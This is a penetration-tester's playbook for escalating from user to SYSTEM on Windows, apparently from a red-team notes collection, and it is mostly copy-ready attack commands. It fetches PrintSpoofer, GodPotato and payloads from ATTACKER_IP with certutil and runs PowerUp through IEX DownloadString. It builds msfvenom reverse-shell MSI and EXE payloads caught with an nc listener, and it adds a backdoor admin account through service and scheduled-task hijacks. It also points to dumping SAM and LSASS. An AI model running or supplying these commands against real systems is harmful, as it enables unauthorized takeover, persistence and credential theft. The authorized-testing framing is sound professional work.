# Windows Privilege Escalation

**Purpose:** Only privilege escalation on Windows. Assumes you have user-level shell.

---

## Priority 1: Check Privileges

### What Privileges Do You Have?

```powershell
# Check all privileges
whoami /priv

# Check groups
whoami /groups

# Full information
whoami /all
```

### Key Privileges to Look For

**SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege:**
- **Impact:** Instant SYSTEM
- **Tool:** PrintSpoofer or GodPotato

---

## SeImpersonate/SeAssignPrimaryToken Exploitation

### Using PrintSpoofer

```powershell
# Download
certutil -urlcache -f http://ATTACKER_IP/PrintSpoofer64.exe PrintSpoofer.exe

# Execute for SYSTEM shell
.\PrintSpoofer.exe -i -c cmd

# Verify
whoami
# nt authority\system
```

### Using GodPotato

```powershell
# Download
certutil -urlcache -f http://ATTACKER_IP/GodPotato-NET4.exe GodPotato.exe

# Execute
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c net user hacker Password123! /add"
```

**Time:** 2-3 minutes
**Success Rate:** 95%+ if privilege exists

---

## Priority 2: AlwaysInstallElevated

### Check Registry Keys

```powershell
# Both must be set to 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploitation

**If both return `0x1`:**

```bash
# On Kali: Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o exploit.msi

# Start listener
nc -lvnp 4444
```

```powershell
# On target: Download and install
certutil -urlcache -f http://ATTACKER_IP/exploit.msi exploit.msi
msiexec /quiet /qn /i exploit.msi
```


---

## Priority 3: Unquoted Service Paths

### Find Vulnerable Services

```powershell
# List services with unquoted paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### Check Write Permissions

```powershell
# Check directory permissions
icacls "C:\Program Files\Vulnerable App"

# Look for M (Modify) or F (Full Control)
```

### Exploitation

```bash
# On Kali: Create payload matching the space in path
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Program.exe
```

```powershell
# Upload to exploit the space
# Example: C:\Program Files\Vulnerable App\service.exe
# Create: C:\Program.exe

certutil -urlcache -f http://ATTACKER_IP/Program.exe "C:\Program.exe"

# Restart service
sc stop VulnerableService
sc start VulnerableService
```

---

## Priority 4: Weak Service Permissions

### Check Service Permissions

```powershell
# List all services
sc query

# Check specific service permissions
sc qc ServiceName

# Using accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
```

### Exploitation

```powershell
# If you can modify service config
sc config VulnerableService binpath= "cmd /c net user hacker Password123! /add"
sc stop VulnerableService
sc start VulnerableService

# Add to administrators
sc config VulnerableService binpath= "cmd /c net localgroup administrators hacker /add"
sc stop VulnerableService  
sc start VulnerableService
```

---

## Automated Enumeration

### WinPEAS

```powershell
# Download
certutil -urlcache -f http://ATTACKER_IP/winPEASx64.exe winPEAS.exe

# Run
.\winPEAS.exe

# Save output
.\winPEAS.exe > winpeas_output.txt

# Review focusing on RED/YELLOW findings
```

### PowerUp (PowerShell)

```powershell
# Download and import
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail
```
**Use automated tools to IDENTIFY vectors, then manually exploit**

---

## Registry-Based Privilege Escalation

### AutoLogon Credentials

```powershell
# Check for autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Look for:
# DefaultUserName
# DefaultPassword
```

### Saved Credentials

```powershell
# List saved credentials
cmdkey /list

# If credentials saved, use runas
runas /savecred /user:ADMIN cmd
```

---

## Scheduled Tasks

### Find Writable Scheduled Tasks

```powershell
# List scheduled tasks
schtasks /query /fo LIST /v

# Check task permissions
icacls "C:\Path\To\Task\Script.bat"

# If writable, modify script
echo "net user hacker Password123! /add" > "C:\Path\To\Task\Script.bat"

# Wait for task to run or force it
schtasks /run /tn TaskName
```

---

## DLL Hijacking

### Find DLL Search Order Issues

```powershell
# Check application directory permissions
icacls "C:\Program Files\Application"

# If writable, check what DLLs application loads
# Use Process Monitor (procmon) to identify missing DLLs
```

**Complex technique - only attempt if other methods fail**

---

## Privilege Escalation Workflow

### Systematic Approach

**Quick Manual Checks**
```powershell
whoami /priv
whoami /groups
```

**Run WinPEAS**
```powershell
.\winPEAS.exe
```

**Review and Prioritize**
```
Look for in order:
1. SeImpersonate ‚Üí PrintSpoofer (instant)
2. AlwaysInstallElevated ‚Üí MSI exploit
3. Unquoted service paths ‚Üí Binary replacement
4. Weak service permissions ‚Üí Config modification
5. Autologon credentials ‚Üí Password reuse
6. Scheduled tasks ‚Üí Script modification
```

**Attempt Exploitation**
```
Try highest priority vector first
If fails, move to next
Don't spend >15 min on single technique
```

**Documentation**
```
If successful:
- Screenshot SYSTEM proof
- Document attack chain
- Create finding

If unsuccessful:
- Document current access (user level)
- Note attempted methods
- Create finding for initial access
- Move to lateral movement
```

---

## When You Get SYSTEM

**Immediate actions:**

1. **Verify access level:**
```powershell
whoami
# nt authority\system
```

2. **Don't celebrate yet - document!**
- Screenshot immediately
- Save command used
- Note time for timeline

3. **Move to credential dumping:**
- See: `03-POST-EXPLOITATION/windows/credential-dumping.md`
- Extract SAM hashes
- Dump LSASS if possible
- DCSync if domain admin

4. **Create GhostWriter finding:**
- Title: "SeImpersonate Privilege Enables SYSTEM Escalation"
- Severity: CRITICAL (if user‚ÜíSYSTEM) or HIGH (if local admin‚ÜíSYSTEM)
- Include complete attack chain

---

## When You Don't Get SYSTEM

**After 40 minutes with no success:**

**Document what you have:**
- Current user access level
- Groups you're in
- Services you can access
- Files you can read

**Create findings for:**
- How you got initial access (still valuable!)
- Information disclosure (what you can access)
- Weak authentication (how credentials were obtained)

**Move on:**
- Lateral movement to other systems
- Credential hunting on current system
- Different target entirely

**Not every system needs to be rooted to have a good report!**

---

## Common Mistakes

‚ùå **Not checking whoami /priv first**
‚úÖ Always check privileges before anything else

‚ùå **Trying kernel exploits on Windows**
‚úÖ Windows kernel exploits are rare and unstable

‚ùå **Spending 2+ hours on single system**
‚úÖ 40 minute limit, then move on

‚ùå **Not running WinPEAS**
‚úÖ Automated tools find things you'll miss

‚ùå **Forgetting about PrintSpoofer**
‚úÖ SeImpersonate is THE most common path to SYSTEM

---

**Windows privilege escalation is usually about finding ONE misconfiguration. Check privileges first (Se Impersonate = instant win), run WinPEAS, exploit the highest priority finding, and document thoroughly.** üîê
